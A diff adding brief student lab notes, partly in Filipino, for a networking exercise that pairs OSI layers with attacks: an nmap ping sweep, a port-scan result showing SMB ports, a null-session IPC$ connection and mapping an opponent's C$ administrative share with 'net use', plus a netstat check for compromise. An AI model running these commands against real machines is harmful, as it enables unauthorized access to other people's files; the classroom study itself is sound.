@@ -81,6 +81,93 @@ Physical 1 - Bits
 3. Electrical 
 
 
+Task 2:
+Layer 3 Attack: nmap -sP 10.k.1.0/24
+
+Layer 4 Attack: -v 10.k.1.0
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+
+Layer 5 Attack: 
+net use x: /delete
+net use \\10.k.1.10\ipc$
+
+
+Layer 7: nakawin ang drive C: ni kalaban, gawing drive mo
+
+net use x: \\10.k.1.10\c$
+
+How to know if na hack ka
+netstat -s -p tcp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
